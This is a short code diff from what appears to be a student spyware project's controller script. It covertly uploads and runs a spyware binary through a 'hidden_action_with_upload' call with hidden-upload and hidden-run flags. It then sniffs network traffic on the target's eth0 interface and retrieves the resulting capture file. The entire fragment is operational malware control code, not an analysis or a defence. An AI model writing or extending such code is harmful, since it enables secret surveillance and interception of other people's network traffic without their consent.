@@ -39,7 +39,7 @@ def main():
         agent.hidden_action_with_upload(
             FunCode.HIDDEN_UPLOAD | FunCode.HIDDEN_RUN,
             "/home/avner/Arazim-Projects-2024---spyware/spyware",
-            "sentSpyware.spy",
+            "sentSpyware5.spy",
         )
     )
 
@@ -49,7 +49,8 @@ def main():
 
     params = ContParams(SnifferType, Params(SniffParams(20, b"eth0")))
     print(spyAgent.runContraption(params, 10))
-    print(spyAgent.retrieve_file("fishTest.txt"))
+    sleep(30)
+    print(spyAgent.retrieve_file("0.sniff"))
 
 
 if __name__ == "__main__":
